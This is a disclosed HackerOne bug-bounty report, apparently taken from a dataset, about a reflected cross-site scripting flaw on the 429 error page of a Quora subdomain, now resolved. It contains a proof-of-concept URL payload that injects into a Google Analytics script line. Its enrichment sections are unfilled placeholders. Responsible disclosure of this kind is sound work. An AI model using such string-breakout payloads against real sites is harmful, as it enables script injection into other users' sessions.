---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '189768'
original_report_id: '189768'
title: '[controlsyou.quora.com] 429 Too Many Requests Error-Page XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: quora
created_at: '2016-12-09T09:03:47.961Z'
disclosed_at: '2017-03-31T19:35:43.972Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 16
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [controlsyou.quora.com] 429 Too Many Requests Error-Page XSS

## Metadata

- HackerOne Report ID: 189768
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: quora
- Disclosed At: 2017-03-31T19:35:43.972Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
XSS on the error page when the user makes too many requests.

### Steps To Reproduce

1. Make a lot of requests to get the error 429
2. Open PoC in FireFox

```
https://controlsyou.quora.com/'-alert(document.domain)-'
``` 

**HTTP Response**
```
<script type="text/javascript">
...
ga('set', 'dimension1', 'board-'-alert(document.domain)-'');
ga('set', 'dimension2', 'False');
ga('set', 'dimension3', 'False');});});</script>
```


### Optional: Your Environment (Browser version, Device, app version, os version etc)
Tested on FireFox 50.0.2

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
